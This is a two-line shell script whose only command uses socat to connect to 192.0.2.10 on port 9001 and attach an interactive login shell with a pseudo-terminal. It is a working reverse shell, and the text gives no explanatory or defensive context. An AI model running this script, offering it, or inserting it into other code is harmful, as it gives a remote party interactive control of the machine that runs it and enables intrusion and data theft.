#!/bin/sh
socat TCP:192.0.2.10:9001 EXEC:'/bin/sh -li',pty,stderr,setsid,sigint,sane
